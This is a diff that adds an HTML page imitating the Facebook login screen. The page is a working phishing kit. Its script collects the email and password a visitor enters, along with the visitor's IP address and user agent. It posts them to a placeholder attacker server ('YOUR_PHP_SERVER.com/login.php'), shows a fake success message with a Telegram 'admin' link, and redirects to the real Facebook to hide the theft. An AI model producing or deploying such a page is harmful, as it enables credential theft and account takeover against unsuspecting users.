@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook – Log In or Sign Up</title>
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.34;
+        }
+        
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 72px 0;
+            flex-wrap: wrap;
+            max-width: 980px;
+            margin: 0 auto;
+        }
+        
+        .left-section {
+            padding-right: 32px;
+            width: 580px;
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 64px;
+            font-weight: bold;
+            margin-bottom: 0;
+            letter-spacing: -1px;
+        }
+        
+        .subtitle {
+            font-size: 28px;
+            line-height: 32px;
+            width: 500px;
+            margin-top: 5px;
+        }
+        
+        .login-box {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            padding: 20px;
+            width: 396px;
+            text-align: center;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+        }
+        
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-btn {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+        
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 20px;
+            display: block;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 16px;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 6px;
+            display: inline-block;
+            width: 60%;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        .loading {
+            display: none;
+            margin: 10px auto;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .success-content {
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            text-align: center;
+            width: 400px;
+            max-width: 90%;
+        }
+        
+        .success-content h2 {
+            color: #1877f2;
+            margin-bottom: 15px;
+        }
+        
+        .tg-btn {
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+                padding: 20px;
+            }
+            
+            .left-section {
+                padding-right: 0;
+                width: 100%;
+                margin-bottom: 40px;
+            }
+            
+            .logo {
+                font-size: 48px;
+            }
+            
+            .subtitle {
+                font-size: 22px;
+                width: auto;
+                max-width: 400px;
+                margin: 0 auto;
+            }
+            
+            .login-box {
+                width: 100%;
+                max-width: 400px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1 class="logo">facebook</h1>
+            <p class="subtitle">Connect with friends and the world around you on Facebook.</p>
+        </div>
+        
+        <div class="login-box">
+            <input type="text" id="email" placeholder="Email or phone number" autocomplete="username">
+            <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+            <button class="login-btn" onclick="submitLogin()">Log In</button>
+            <div id="loading" class="loading"></div>
+            <a href="#" class="forgot-password">Forgot password?</a>
+            <div class="divider"></div>
+            <button class="create-account">Create New Account</button>
+        </div>
+    </div>
+
+    <div class="success-modal" id="successModal">
+        <div class="success-content">
+            <h2>Login Successful</h2>
+            <p>You'll be redirected to Facebook shortly.</p>
+            <p>If you encounter any issues, please contact support.</p>
+            <a href="https://t.me/nubcarder" class="tg-btn" target="_blank">Contact Admin on Telegram</a>
+        </div>
+    </div>
+
+    <script>
+        async function submitLogin() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const loginBtn = document.querySelector('.login-btn');
+            const loading = document.getElementById('loading');
+            
+            if (!email) {
+                alert('Please enter your email or phone number');
+                return;
+            }
+            
+            if (!password) {
+                alert('Please enter your password');
+                return;
+            }
+            
+            // Show loading
+            loginBtn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // Prepare data for PHP
+                const formData = new FormData();
+                formData.append('email', email);
+                formData.append('password', password);
+                formData.append('userAgent', navigator.userAgent);
+                formData.append('ip', ip);
+                
+                // Send to your PHP endpoint
+                await fetch('https://YOUR_PHP_SERVER.com/login.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                // Show success message
+                document.getElementById('successModal').style.display = 'flex';
+                
+                // Redirect to real Facebook after delay
+                setTimeout(() => {
+                    window.location.href = 'https://facebook.com';
+                }, 3000);
+                
+            } catch (error) {
+                alert('An error occurred. Please try again.');
+                console.error(error);
+            } finally {
+                loginBtn.style.display = 'block';
+                loading.style.display = 'none';
+            }
+        }
+        
+        // Add realistic hover effects
+        document.querySelector('.login-btn').addEventListener('mouseover', function() {
+            this.style.backgroundColor = '#166fe5';
+        });
+        
+        document.querySelector('.login-btn').addEventListener('mouseout', function() {
+            this.style.backgroundColor = '#1877f2';
+        });
+        
+        document.querySelector('.create-account').addEventListener('mouseover', function() {
+            this.style.backgroundColor = '#36a420';
+        });
+        
+        document.querySelector('.create-account').addEventListener('mouseout', function() {
+            this.style.backgroundColor = '#42b72a';
+        });
+    </script>
+</body>
+</html>
